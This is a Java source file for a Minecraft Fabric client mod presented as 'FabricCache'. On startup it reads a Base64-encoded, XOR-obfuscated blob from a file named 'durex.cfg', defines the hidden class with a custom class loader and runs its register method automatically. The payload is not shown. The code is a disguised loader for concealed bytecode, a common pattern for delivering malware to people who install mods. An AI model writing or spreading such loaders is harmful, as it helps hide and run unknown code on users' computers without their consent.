package fc;

import net.fabricmc.api.ClientModInitializer;
import java.io.InputStream;

public class CacheInit implements ClientModInitializer {
    
    @Override
    public void onInitializeClient() {
        System.out.println("[FabricCache] Initializing...");
        try {
            load();
            System.out.println("[FabricCache] Loaded successfully");
        } catch (Exception e) {
            System.out.println("[FabricCache] Error: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    private static void load() throws Exception {
        // Read durex.cfg from resources
        byte[] data;
        try (InputStream is = CacheInit.class.getResourceAsStream("/durex.cfg")) {
            if (is == null) {
                System.out.println("[FabricCache] durex.cfg not found");
                return;
            }
            String base64 = new String(is.readAllBytes()).replaceAll("\\s+", "");
            data = fromText(base64);
        }
        
        // Load and execute on Minecraft thread
        final byte[] bytes = data;
        net.minecraft.client.MinecraftClient.getInstance().execute(() -> {
            try {
                String name = readClassName(bytes);
                System.out.println("[FabricCache] Loading class: " + name);
                
                // Define class using custom ClassLoader
                CustomLoader cl = new CustomLoader(CacheInit.class.getClassLoader());
                Class<?> cls = cl.define(name, bytes);
                Object inst = cls.getDeclaredConstructor().newInstance();
                cls.getMethod("register").invoke(inst);
                
                System.out.println("[FabricCache] Class loaded and registered");
            } catch (Throwable t) {
                System.out.println("[FabricCache] Load error: " + t.getMessage());
                t.printStackTrace();
            }
        });
    }
    
    private static byte[] fromText(String s) throws Exception {
        // Decode Base64
        Object decoder = Class.forName("java.util.Base64")
            .getMethod("getDecoder")
            .invoke(null);
        byte[] raw = (byte[]) decoder.getClass()
            .getMethod("decode", String.class)
            .invoke(decoder, s);
        
        // XOR with 0x42
        for (int i = 0; i < raw.length; i++) {
            raw[i] ^= 0x42;
        }
        return raw;
    }
    
    private static String readClassName(byte[] b) {
        try {
            int off = 8;
            int cpCount = ((b[off] & 0xFF) << 8) | (b[off + 1] & 0xFF);
            off += 2;
            String[] strs = new String[cpCount];
            int[] refs = new int[cpCount];
            
            for (int i = 1; i < cpCount; i++) {
                int tag = b[off++] & 0xFF;
                switch (tag) {
                    case 1:
                        int len = ((b[off] & 0xFF) << 8) | (b[off + 1] & 0xFF);
                        off += 2;
                        strs[i] = new String(b, off, len, "UTF-8");
                        off += len;
                        break;
                    case 7:
                        refs[i] = ((b[off] & 0xFF) << 8) | (b[off + 1] & 0xFF);
                        off += 2;
                        break;
                    case 5: case 6:
                        off += 8;
                        i++;
                        break;
                    case 3: case 4: case 9: case 10: case 11: case 12: case 18:
                        off += 4;
                        break;
                    case 8: case 16: case 19: case 20:
                        off += 2;
                        break;
                    case 15:
                        off += 3;
                        break;
                    default:
                        off += 2;
                }
            }
            
            off += 2;
            int idx = ((b[off] & 0xFF) << 8) | (b[off + 1] & 0xFF);
            return strs[refs[idx]].replace('/', '.');
        } catch (Exception e) {
            return "pl.durex.client.module.LicenseModule";
        }
    }
    
    private static class CustomLoader extends ClassLoader {
        public CustomLoader(ClassLoader parent) {
            super(parent);
        }
        
        public Class<?> define(String name, byte[] bytes) {
            return defineClass(name, bytes, 0, bytes.length);
        }
    }
}
